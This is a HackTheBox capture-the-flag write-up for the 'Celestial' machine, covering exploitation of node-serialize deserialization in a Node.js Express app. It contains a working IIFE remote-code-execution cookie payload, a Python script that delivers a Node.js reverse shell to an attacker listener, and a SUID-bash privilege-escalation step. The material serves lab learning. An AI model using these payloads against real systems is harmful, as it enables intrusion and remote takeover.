---
title: HackTheBox - Celestial
categories: htb node IIFE
excerpt: | 
   Celestial is a medium difficulty Linux machine. It is a node service.

feature_text: |
  ## Celestial - Medium
  
feature_image: "https://picsum.photos/2560/600?image=733"
image: "https://picsum.photos/2560/600?image=733"
---

### Scanning process
sudo nmap -p- --open -sCV -n -Pn \<ip\> -oN targeted:
``` python 
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```
Celestial is a medium difficulty Linux machine. It is a node.js service, which use a cookie to show a message. The server will get the value of cookie and maybe _deserialize_ it. 

What's Serialization?
>**Serialization** is the process of converting a data object -normally a combination of code and data within a region of data storage- into a series of bytes that saves the states of the object in a easily transmitable form.

What's Deserialization?
>**Deserialization** is the process of reconstructing a data structure or object from a series of bytes.

We have a message that it's sent over the request. So, probabily data is sent serialized, and there is a vulnerability in the process of deserialization on the server side. This is an example of server side.
``` python
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
```
As we can see there is a cookie encoded in base64 that is deserializated in the **unserialize** function. If we can modify the normal fluent of this function we can get a RCE.

### Exploit vulnerabilities
Data in unserialize function can be execute firstly if we use javascript's **Inmediatly Invoce Function Expression (IIFE)** for calling the function. Adding the IIFE brackets **()** after the function body, this one will be invoked after the object is created. An example of data sent could be:

``` python
{"username":"Mayo123","country":"Idk","city":"Lametown","num":"2","rce":"function(){require('child_process').exec('ls /', function(error, stdout, stderr) {console.log(stdout)}); }()"}
```

If you use this script you will get an interactive console on `nc -lnvp 444`:
``` python
import requests, signal, pdb, time, sys, base64
  
# VARIABLE GLOBAL
main_url = 'http://10.10.10.85:3000'

def handler(signum, frame):
    print("\n\n[!] Saliendo del programa.")
    sys.exit( -1 )

signal.signal(signal.SIGINT, handler)

def charencode(string):
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

def interactive_mode():
    NODEJS_REV_SHELL='''
    var net = require('net');
    var spawn = require('child_process').spawn;
    HOST="%s";
    PORT="%s";
    TIMEOUT="5000";

    function c(HOST,PORT) {
        var client = new net.Socket();
        client.connect(PORT, HOST, function() {
            var sh = spawn('/bin/sh',[]);
            client.write("Connected!\\n");
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            sh.on('exit',function(code,signal){
              client.end("Disconnected!\\n");
            });
        });
        client.on('error', function(e) {
            setTimeout(c(HOST,PORT), TIMEOUT);
        });
    }
    c(HOST,PORT);
    ''' % ('<your_ip>', '444')

    PAYLOAD = charencode(NODEJS_REV_SHELL)
    my_cookie = """{"rce":"_$$ND_FUNC$$_function(){ eval(String.fromCharCode(""" + PAYLOAD + """)) }()"}""" 
    PAYLOAD_B64 = base64.b64encode(my_cookie.encode('utf-8')).decode('ascii')

    cookie_formated = {
        "name": "profile",
        "value": PAYLOAD_B64,
        "domain": "10.10.10.85",
        "path": "/"
    }
    s = requests.Session()
    s.cookies.set(**cookie_formated)
    res = s.get(url=main_url)

if __name__ == "__main__":
    interactive_mode()
```

### Privilege Scalation
This will be easier than the intrusion method. You can see an `script.py` in Documents directory. It is a proof of some schedule task, so we can do a procmon --like we did in [Meta](https://amayoo0.github.io/htb/procmon/2022/06/12/Meta/)-- and see that there is an script, which owner is sun, executed by root. Edit it to set `/bin/bash` SUID privilege and execute `ash -p`.

 And that's all!
